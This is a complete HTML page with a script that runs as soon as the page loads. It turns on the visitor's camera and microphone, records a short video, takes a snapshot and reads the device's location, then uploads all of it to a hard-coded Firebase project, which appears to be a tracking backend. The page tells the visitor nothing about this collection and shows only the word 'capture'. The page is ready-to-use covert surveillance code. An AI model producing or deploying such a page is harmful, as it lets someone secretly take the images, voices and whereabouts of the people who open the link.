<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Auto Capture</title>
  <style>
    video, canvas { width: 100%; max-width: 400px; margin-bottom: 10px; }
  </style>
</head>
<body>

<h2>capture</h2>
<video id="video" autoplay muted></video>
<canvas id="canvas" style="display: none;"></canvas>

<!-- Firebase SDK -->
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
  import { getStorage, ref as storageRef, uploadBytes } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js";
  import { getDatabase, ref as dbRef, push } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyB9gvB6nf1Rt4gNagZbk09lMKGrm2lVuBk",
    authDomain: "photo-video-tra.firebaseapp.com",
    projectId: "photo-video-tra",
    storageBucket: "photo-video-tra.appspot.com",
    messagingSenderId: "505988317733",
    appId: "1:505988317733:web:56f500762f88d70530b5cc",
    measurementId: "G-1GMN0FJ3MC",
    databaseURL: "https://photo-video-tra-default-rtdb.firebaseio.com/"
  };

  const app = initializeApp(firebaseConfig);
  const storage = getStorage(app);
  const db = getDatabase(app);

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');

  async function start() {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    video.srcObject = stream;

    const recorder = new MediaRecorder(stream);
    const chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);

    recorder.onstop = async () => {
      const blob = new Blob(chunks, { type: 'video/webm' });
      const videoStorageRef = storageRef(storage, 'videos/' + Date.now() + '.webm');
      await uploadBytes(videoStorageRef, blob);
    };

    recorder.start();

    setTimeout(async () => {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0);

      canvas.toBlob(async blob => {
        const imageRef = storageRef(storage, 'images/' + Date.now() + '.jpg');
        await uploadBytes(imageRef, blob);
      });

      navigator.geolocation.getCurrentPosition(async pos => {
        const data = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          timestamp: Date.now()
        };
        await push(dbRef(db, 'users'), data);
      });

      stream.getTracks().forEach(t => t.stop());
      recorder.stop();
    }, 5000);
  }

  window.onload = start;
</script>

</body>
</html>
